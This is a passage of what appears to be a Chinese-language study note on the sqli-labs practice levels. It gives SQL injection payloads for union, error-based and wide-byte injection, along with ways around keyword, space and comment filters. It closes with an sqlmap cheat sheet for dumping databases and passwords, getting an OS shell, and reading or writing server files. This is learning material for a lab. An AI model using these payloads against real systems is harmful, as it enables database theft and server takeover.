&#x2F;&gt;输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-23&#x2F;?id=-1&#x27; union select 1,@@datadir,&#x27;3&lt;br &#x2F;&gt;其中-1&#x27; union select 1,@@datadir,’3，第一个’(单引号)闭合-1，第二个’(单引号)闭合后面 的。这样将查询内容显示在 username 处&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623344846740-decdec71-98c8-4eb3-8c2f-d08b8c07309b.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=Id63P&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%881.07.10.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=969525&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-11 上午1.07.10.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;也可以输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-23&#x2F;?id=1&#x27;or extractvalue(1,concat(0x7e,database(),0x7e)) or &#x27;1&#x27;=&#x27;1&lt;br &#x2F;&gt;利用 or &#x27;1&#x27;=&#x27;1 进行闭合（ or &#x27; 也可以）&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623345162760-e6900823-81a3-4ca9-82cd-e1aed32a6156.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=wSpyd&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%881.12.02.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=976979&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-11 上午1.12.02.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;rao-guo-and-orzi-fu-guo-lu&quot;&gt;绕过and&#x2F;or字符过滤&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623488324740-68318ba9-d77e-4d0b-a3c3-4c787c234291.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=WKCd3&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%884.58.23.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=2360794&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午4.58.23.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-25&#x2F;?id=-1 2and 4or5&#x27;&lt;br &#x2F;&gt;发现此题将and和or都替换为空&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623489087703-66e8ab3a-aabc-46ac-83d3-65e6ee5542de.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=M6Aj8&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.10.22.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1080432&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午5.10.22.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;可以尝试使用 &amp;amp;&amp;amp; 和 ||&lt;br &#x2F;&gt;经尝试&amp;amp;&amp;amp;会出现莫名其妙的错误，故使用||&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-25&#x2F;?id=-1&#x27; || extractvalue(1,concat(0x7e,version(),0x7e)) || &#x27;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623489570629-eb59fd85-a04b-48e3-8f99-5738c1ddbc7b.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=rIkoC&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.19.09.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1082062&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午5.19.09.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查表&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-25&#x2F;?id=-1&#x27; || extractvalue(1,concat(0x7e,(select group_concat(table_name) from &lt;strong&gt;infoorrmation&lt;&#x2F;strong&gt;_schema.tables where table_schema=database()),0x7e)) || &#x27;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623489746996-25111e7a-f3ad-434f-8a21-fc60bab28d68.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=XFIrQ&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.22.01.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1103435&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午5.22.01.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;注意这里会把or置空，所以 information 应写作 infoorrmation 来逃逸&lt;&#x2F;p&gt;
&lt;h2 id=&quot;rao-guo-kong-ge-guo-lu&quot;&gt;绕过空格过滤&lt;&#x2F;h2&gt;
&lt;p&gt;如下字符可以当作空格使用&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;%09 TAB键（水平）&lt;&#x2F;li&gt;
&lt;li&gt;%0a 新建一行&lt;&#x2F;li&gt;
&lt;li&gt;%0c 新的一页&lt;&#x2F;li&gt;
&lt;li&gt;%0d return功能&lt;&#x2F;li&gt;
&lt;li&gt;%0b TAB键（垂直）&lt;&#x2F;li&gt;
&lt;li&gt;%a0 空格&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;**&#x2F; 代替空格&lt;&#x2F;li&gt;
&lt;li&gt;用()将名词括起来&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623490402165-c1bc86e5-d408-4421-81d3-8746e56a9ab5.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=kI83X&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.33.08.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1557859&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午5.33.08.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;本题目将空格和注释都过滤掉了&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-26&#x2F;?id=999&#x27; union%a0select%a01,2,&#x27;3&lt;br &#x2F;&gt;注意id后面不能写-1了，只能写一个尽可能大的数，因为 - 被过滤了（--为注释）&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623490964675-d07b5209-7a88-4130-b4c7-c8eec3d6aae8.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=aI0FA&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.42.31.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=995260&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午5.42.31.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623491059324-0a4a8b0b-3eb4-44dc-bad2-56539b9719e5.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=UU2Dz&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%885.43.58.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1621828&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午5.43.58.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;经判断,空格、注释、select、union都被过滤&lt;br &#x2F;&gt;利用 %a0 并且大写union和select的某些字母来绕过&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-27&#x2F;?id=999&#x27;%a0UnIon%a0SeLect%a01,2,&#x27;3&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623503390771-2b76c456-66cf-4081-83b2-b8ffa76947c8.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=XRnye&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%889.07.50.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1025992&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午9.07.50.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查表名&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-27&#x2F;?id=999&#x27;%a0UnIon%a0SeLect%a01,(SeLect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database()),&#x27;3&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623503695965-b559993b-ea22-4c28-98d1-bff7b1626937.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=bf4ZU&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%889.14.07.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1066148&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午9.14.07.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;nei-lian-zhu-shi-rao-guo&quot;&gt;内联注释绕过&lt;&#x2F;h2&gt;
&lt;p&gt;使用&#x2F;&lt;em&gt;！内容&lt;&#x2F;em&gt;&#x2F;的形式包裹select和union可绕过，如&lt;br &#x2F;&gt;&#x2F;&lt;em&gt;!union&lt;&#x2F;em&gt;&#x2F;&#x2F;&lt;em&gt;!select&lt;&#x2F;em&gt;&#x2F;&#x2F;*!version()&#x2F;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;kuan-zi-jie-zhu-ru&quot;&gt;宽字节注入&lt;&#x2F;h2&gt;
&lt;p&gt;原理:mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字(前一个 ascii 码大于 128 才能到汉字的范围)。我们在过滤 &#x27; 的时候，往往利用的思 路是将 &#x27; 转换为 &#x27; 。 因此我们在此想办法将 &#x27; 前面添加的 \ 除掉，一般有两种思路:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;%df 吃掉 \ 具体的原因是 urlencode(&#x27;) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，而上面􏰀到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。&lt;&#x2F;li&gt;
&lt;li&gt;将 &#x27; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c给注释掉。这也是 bypass 的一种方法。&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623504698949-14531d34-a583-4010-b522-cff09bf005eb.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=NHiSI&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%889.31.25.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=979303&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午9.31.25.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;这里在 &#x27; 前面输入%df 即可逃逸成功&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623507680451-6ac80bce-ffdc-4abb-847d-95dc3fc19966.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=FKi9c&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%8810.20.43.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1028054&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午10.20.43.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623507786008-627a7716-f671-44fa-bcf4-721639679c99.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=YPOph&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%8810.22.48.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=973973&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-12 下午10.22.48.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;get型的方式我们是以url形式提交的，因此数据会通过 URLencode，如何将方法用在 post 型的注入当中，我们此处介绍 一个新的方法。将 utf-8 转换为 utf-16 或 utf-32，例如将 &#x27; 转为 utf-16 为 􏰃 &#x27; 。我们就可以利用这个方式进行尝试。&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623508411874-d3530e4c-a917-4eda-af71-fd5f76b8fd33.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=674&amp;amp;id=jy6TA&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-12%20%E4%B8%8B%E5%8D%8810.33.16.png&amp;amp;originHeight=674&amp;amp;originWidth=1472&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=659954&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=1472&quot; alt=&quot;截屏2021-06-12 下午10.33.16.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;此关卡也可以使用sqlmap更方便地进行注入&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-34&#x2F; --data &amp;quot;uname=admin&amp;amp;passwd=admin&amp;quot; --tamper=unmagicquotes -D security -T users --dump-all&lt;br &#x2F;&gt;即可得到&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623688677237-f6464e08-6377-417e-9a77-cf40d095d470.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=317&amp;amp;id=Wj04Z&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8A%E5%8D%8812.37.39.png&amp;amp;originHeight=986&amp;amp;originWidth=788&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=719881&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=253&quot; alt=&quot;截屏2021-06-15 上午12.37.39.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;注意，这里使用了sqlmap的脚本 unmagicquotes.py&lt;&#x2F;p&gt;
&lt;h1 id=&quot;sqlmapde-shi-yong&quot;&gt;SQLMAP的使用&lt;&#x2F;h1&gt;
&lt;p&gt;sqlmap -r http.txt  #http.txt是我们抓取的http的请求包&lt;br &#x2F;&gt;sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;www.xx.com&#x2F;username&#x2F;admin_&amp;quot;       #如果我们已经知道admin这里是注入点的话，可以在其后面加个_来让sqlmap对其注入&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot;   #探测该url是否存在漏洞&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot;   --cookie=&amp;quot;抓取的cookie&amp;quot;   #当该网站需要登录时，探测该url是否存在漏洞&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot;  --data=&amp;quot;uname=admin&amp;amp;passwd=admin&amp;amp;submit=Submit&amp;quot;  #抓取其post提交的数据填入&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; --users      #查看数据库的所有用户&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; --passwords  #查看数据库用户名的密码&lt;br &#x2F;&gt;有时候使用 --passwords 不能获取到密码，则可以试下&lt;br &#x2F;&gt;-D mysql -T user -C host,user,password --dump  当MySQL&amp;lt; 5.7时&lt;br &#x2F;&gt;-D mysql -T user -C host,user,authentication_string --dump  当MySQL&amp;gt;= 5.7时&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; --current-user  #查看数据库当前的用户&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; --is-dba    #判断当前用户是否有管理员权限&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候&lt;&#x2F;p&gt;
&lt;p&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot;    --dbs        #爆出所有的数据库&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot;    --tables     #爆出所有的数据表&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot;    --columns    #爆出数据库中所有的列&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot;    --current-db #查看当前的数据库&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; -D security --tables #爆出数据库security中的所有的表&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; -D security -T users --columns #爆出security数据库中users表中的所有的列&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据&lt;&#x2F;p&gt;
&lt;p&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; -D security -T users --dump-all #爆出数据库security中的users表中的所有数据&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; -D security --dump-all   #爆出数据库security中的所有数据&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; --dump-all  #爆出该数据库中的所有数据&lt;&#x2F;p&gt;
&lt;p&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot;  --tamper=space2comment.py  #指定脚本进行过滤，用&#x2F;**&#x2F;代替空格&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-4&#x2F;?id=1&amp;quot; --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent&#x2F;referer注入。&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&amp;quot; --sql-shell  #执行指定的sql语句&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-4&#x2F;?id=1&amp;quot; --os-shell&#x2F;--os-cmd   #执行--os-shell命令，获取目标服务器权限&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-4&#x2F;?id=1&amp;quot; --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上&lt;&#x2F;p&gt;
&lt;p&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-4&#x2F;?id=1&amp;quot; --file-read &amp;quot;c:&#x2F;test.txt&amp;quot; #读取目标服务器C盘下的test.txt文件&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-4&#x2F;?id=1&amp;quot; --file-write  test.txt  --file-dest &amp;quot;e:&#x2F;hack.txt&amp;quot;  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt&lt;&#x2F;p&gt;
&lt;p&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-4&#x2F;?id=1&amp;quot; --dbms=&amp;quot;MySQL&amp;quot;     #指定其数据库为mysql&lt;br &#x2F;&gt;其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-4&#x2F;?id=1&amp;quot; --random-agent   #使用任意的User-Agent爆破&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-4&#x2F;?id=1&amp;quot; --proxy=&amp;quot;&lt;a href=&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&gt;http:&#x2F;&#x2F;127.0.0.1:8080&lt;&#x2F;a&gt;&amp;quot;    #指定代理&lt;br &#x2F;&gt;当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl&lt;br &#x2F;&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-4&#x2F;?id=1&amp;quot; --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。&lt;br &#x2F;&gt;支持的探测方式如下：&lt;br &#x2F;&gt;　　B: Boolean-based blind SQL injection（布尔型注入）&lt;br &#x2F;&gt;　　E: Error-based SQL injection（报错型注入）&lt;br &#x2F;&gt;　　U: UNION query SQL injection（可联合查询注入）&lt;br &#x2F;&gt;　　S: Stacked queries SQL injection（可多语句查询注入）&lt;br &#x2F;&gt;　　T: Time-based blind SQL injection（基于时间延迟注入）&lt;&#x2F;p&gt;
